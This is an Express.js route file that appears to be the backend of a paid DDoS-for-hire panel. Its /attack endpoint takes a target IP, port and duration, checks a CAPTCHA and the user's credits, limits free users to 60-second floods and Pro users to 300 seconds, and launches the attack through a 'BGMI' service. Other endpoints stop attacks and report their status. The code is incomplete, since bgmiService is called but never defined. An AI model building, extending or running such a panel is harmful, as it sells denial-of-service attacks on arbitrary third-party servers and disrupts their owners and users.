const express = require('express');
const router = express.Router();
const auth = require('../middleware/authMiddleware');
const User = require('../models/User');
const axios = require('axios');
const usedCaptchaTokens = new Map();

// ─── GET /api/panel/me ────────────────────────────────────────────────────────
router.get('/me', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });
        res.json(user);
    } catch {
        res.status(500).json({ message: 'Server error' });
    }
});


function blacklistToken(token) {
    usedCaptchaTokens.set(token, Date.now() + 310_000);
    for (const [t, exp] of usedCaptchaTokens) {
        if (Date.now() > exp) usedCaptchaTokens.delete(t);
    }
}

function isTokenBlacklisted(token) {
    const exp = usedCaptchaTokens.get(token);
    if (!exp) return false;
    if (Date.now() > exp) { usedCaptchaTokens.delete(token); return false; }
    return true;
}

async function verifyTurnstile(token, ip) {
    if (!token || token.length < 10) return { success: false };
    if (isTokenBlacklisted(token)) return { success: false, 'error-codes': ['duplicate-use'] };
    try {
        const params = new URLSearchParams({
            secret: process.env.TURNSTILE_SECRET,
            response: token,
        });
        if (ip && ip !== '::1' && !ip.startsWith('::ffff:127')) {
            params.append('remoteip', ip);
        }
        const { data } = await axios.post(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            params,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        if (data.success) blacklistToken(token);
        return data;
    } catch {
        return { success: false };
    }
}

// ─── POST /api/panel/attack ───────────────────────────────────────────────────
//
//  Rules:
//    • Must be authenticated
//    • Must have at least 1 credit
//    • ip, port, duration are required and validated
//    • Free users  → duration capped at 60 seconds
//    • Pro  users  → duration up to 300 seconds (no cap)
//    • 1 credit is deducted per successful launch
// ─────────────────────────────────────────────────────────────────────────────
// routes/panel.js (updated attack route)

router.post('/stop-attack', auth, async (req, res) => {
    try {
        const { bgmiServerUrl } = req.body;

        if (!bgmiServerUrl) {
            return res.status(400).json({ message: 'BGMI server URL is required' });
        }

        const stopResponse = await bgmiService.stopServer(bgmiServerUrl);

        if (!stopResponse.success) {
            return res.status(500).json({
                message: 'Failed to stop attack server',
                error: stopResponse.error
            });
        }

        return res.json({
            message: 'Attack stopped successfully',
            data: stopResponse.data
        });

    } catch (err) {
        console.error('Stop attack error:', err);
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

router.get('/attack-status', auth, async (req, res) => {
    try {
        const { bgmiServerUrl } = req.query;

        if (!bgmiServerUrl) {
            return res.status(400).json({ message: 'BGMI server URL is required' });
        }

        const statusResponse = await bgmiService.getStatus(bgmiServerUrl);

        if (!statusResponse.success) {
            return res.status(500).json({
                message: 'Failed to get attack status',
                error: statusResponse.error
            });
        }

        return res.json({
            message: 'Attack status retrieved successfully',
            data: statusResponse.data
        });

    } catch (err) {
        console.error('Attack status error:', err);
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

router.post('/attack', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });

        const { ip, port, duration, captchaToken } = req.body;

        // Field validation (keep your existing validation)
        if (!ip || !port || !duration) {
            return res.status(400).json({ message: 'IP, port, and duration are required' });
        }

        // IP validation (keep your existing validation)
        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
        if (!ipRegex.test(ip)) {
            return res.status(400).json({ message: 'Invalid IP address format' });
        }

        // CAPTCHA validation (keep your existing validation)
        if (!captchaToken) {
            return res.status(400).json({ message: 'CAPTCHA is required' });
        }
        const captcha = await verifyTurnstile(captchaToken, req.ip);
        if (!captcha.success) {
            return res.status(400).json({
                message: captcha['error-codes']?.includes('duplicate-use')
                    ? 'CAPTCHA already used. Please solve it again.'
                    : 'CAPTCHA verification failed. Please try again.',
            });
        }

        // Port and duration validation (keep your existing validation)
        const portNum = parseInt(port);
        const durNum = parseInt(duration);
        const MAX_DURATION = user.isPro ? 300 : 60;

        if (durNum > MAX_DURATION) {
            return res.status(403).json({
                message: user.isPro
                    ? 'Duration cannot exceed 300 seconds'
                    : `Free accounts are limited to 60 seconds. Upgrade to Pro for up to 300 seconds.`,
                maxDuration: MAX_DURATION,
                isPro: user.isPro,
            });
        }

        // Credit check (keep your existing validation)
        if (user.credits < 1) {
            return res.status(403).json({
                message: 'Insufficient credits. Share your referral link to earn more.',
                credits: user.credits,
            });
        }

        // Start the BGMI server
        const threads = 1; // You can make this configurable if needed
        const bgmiResponse = await bgmiService.startServer(ip, portNum, durNum, threads);

        if (!bgmiResponse.success) {
            console.error('BGMI server start failed:', bgmiResponse.error);
            return res.status(500).json({
                message: 'Failed to start attack server',
                error: bgmiResponse.error
            });
        }

        // Deduct credit
        const updated = await User.findByIdAndUpdate(
            user._id,
            { $inc: { credits: -1 } },
            { new: true }
        );

        console.log(`🚀 Attack launched by ${user.username} → ${ip}:${portNum} for ${durNum}s (isPro: ${user.isPro})`);

        return res.json({
            message: 'Attack launched successfully',
            attack: {
                ip,
                port: portNum,
                duration: durNum,
                bgmiServer: bgmiResponse.apiUrl
            },
            credits: updated.credits,
            isPro: user.isPro,
        });

    } catch (err) {
        console.error('Attack error:', err);
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

module.exports = router;